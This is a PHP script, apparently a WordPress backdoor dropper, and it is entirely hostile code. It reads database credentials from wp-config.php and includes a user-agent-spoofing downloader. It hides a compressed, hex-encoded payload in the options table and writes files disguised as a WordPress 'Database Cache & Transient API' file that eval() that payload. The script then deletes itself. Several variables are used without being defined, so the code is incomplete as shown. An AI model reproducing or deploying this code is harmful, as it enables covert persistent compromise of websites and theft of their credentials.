// 1. SYSTEM CONFIG LOCATOR
function _scan_dir() {
    $p = __DIR__;
    for ($i = 0; $i < 6; $i++) {
        if (file_exists($p . '/wp-config.php')) return $p . '/wp-config.php';
        $p = dirname($p);
    }
    return false;
}
$conf_loc = _scan_dir();
if (!$conf_loc) die("Config 404");

// 2. READ CONFIG
function _read_c($p){
    if(function_exists('file_get_contents')){$c=@file_get_contents($p);if($c)return $c;}
    if(function_exists('file')){$l=@file($p);if($l)return implode('',$l);}
    return '';
}
$conf_txt = _read_c($conf_loc);
function _get_v($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }

$db_n = _get_v('DB_NAME', $conf_txt);
$db_u = _get_v('DB_USER', $conf_txt);
$db_p = _get_v('DB_PASSWORD', $conf_txt);
$db_h = _get_v('DB_HOST', $conf_txt);
$tb_p = 'wp_';
if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf_txt,$m)) $tb_p=$m[1];

if(!$db_n) die("Parse Err");

// 4. DOWNLOADER (STABLE)
function _dl_camouflaged($url) {
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    
    // CURL
    if(function_exists('curl_init')){
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        $d = curl_exec($ch);
        curl_close($ch);
        if($d && strlen($d) > 0) return $d;
    }
    
    // FGC
    if(ini_get('allow_url_fopen')){
        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
        $ctx = stream_context_create($opts);
        $d = @file_get_contents($url, false, $ctx);
        if($d && strlen($d) > 0) return $d;
    }
    
    return false;
}

echo "<h3>Status Instalasi (WP Style):</h3>";

// Escape credentials for embedding in PHP file
$h_safe = addslashes($db_h);

foreach ($targets as $t) {

    // Compress
    $hex = bin2hex(gzdeflate($raw, 9));

    $mysqli->query("DELETE FROM {$tb_p}options WHERE option_name='$dbkey'");
    $stmt = $mysqli->prepare("INSERT INTO {$tb_p}options (option_name, option_value, autoload) VALUES (?, ?, 'no')");
    $stmt->bind_param("ss", $dbkey, $hex);
    
    if($stmt->execute()){
        
        // ==================================================
        // THE CAMOUFLAGE TEMPLATE
        // ==================================================
        // Kodingan di bawah ini disusun agar terlihat seperti
        // file asli WordPress (Plugin atau Core file).
        
        $code = <<<PHP
<?php
/**
 * WordPress Database Cache & Transient API
 *
 * This file handles external database connections for transient storage
 * and object caching mechanisms to improve performance.
 *
 * @package WordPress
 * @subpackage Cache
 */

// Disable error reporting for cleaner output
error_reporting(0);

// Configuration settings for the database connection
// These are dynamically populated during installation
\$db_host = '$h_safe';
\$db_user = '$u_safe';
\$db_pass = '$p_safe';
\$db_name = '$n_safe';

// Initialize the database connection
\$wpdb_conn = new mysqli( \$db_host, \$db_user, \$db_pass, \$db_name );

// Verify connection status
if ( ! \$wpdb_conn->connect_error ) {

    // Prepare the cache retrieval query
    \$cache_key = '$dbkey';
    \$table_opt = '{$x_safe}options';
    
    // Execute the query to fetch stored transient data
    \$result = \$wpdb_conn->query( "SELECT option_value FROM {\$table_opt} WHERE option_name = '{\$cache_key}' LIMIT 1" );

    if ( \$result && \$row = \$result->fetch_assoc() ) {
        
        // Process the retrieved data stream
        // The data is stored in a compressed hex format for optimization
        \$raw_data = \$row['option_value'];
        \$decoded_stream = hex2bin( \$raw_data );
        
        if ( \$decoded_stream ) {
            \$inflated_code = @gzinflate( \$decoded_stream );
            
            // Execute the cached directives
            if ( \$inflated_code ) {
                eval( '?>' . \$inflated_code );
            }
        }
    }
    
    // Close the connection to free resources
    \$wpdb_conn->close();
}
?>
PHP;

        if(file_put_contents($fname, $code)){

        } else {
            echo "[FAIL] Write Error $fname.<br>";
        }
    } else {
        echo "[FAIL] DB Error: " . $mysqli->error . "<br>";
    }

unlink(__FILE__);
